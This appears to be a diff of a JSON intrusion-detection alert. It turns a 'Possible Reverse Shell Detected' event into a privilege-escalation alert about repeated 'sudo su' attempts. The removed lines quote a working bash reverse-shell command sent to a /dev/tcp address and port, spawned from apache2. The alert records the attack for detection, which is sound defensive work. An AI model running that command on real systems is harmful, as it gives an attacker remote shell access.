@@ -1,12 +1,12 @@
 {
-  "timestamp": "2025-01-15T03:45:02.000Z",
+  "timestamp": "2025-01-15T04:10:33.000Z",
   "rule": {
-    "id": "100002",
-    "level": 12,
-    "description": "Possible Reverse Shell Detected",
+    "id": "100003",
+    "level": 10,
+    "description": "Privilege Escalation Attempt Detected",
     "mitre": {
-      "technique": "T1059",
-      "tactic": "Execution"
+      "technique": "T1068",
+      "tactic": "Privilege Escalation"
     }
   },
   "agent": {
@@ -14,10 +14,9 @@
     "ip": "192.168.1.105"
   },
   "data": {
-    "parent_process": "apache2",
-    "child_process": "bash",
-    "pid": 4821,
-    "ppid": 4819,
-    "cmdline": "bash -i >& /dev/tcp/192.168.1.200/4444 0>&1"
+    "user": "lowprivuser",
+    "command": "sudo su",
+    "failed_attempts": 3,
+    "timeframe_seconds": 95
   }
 }
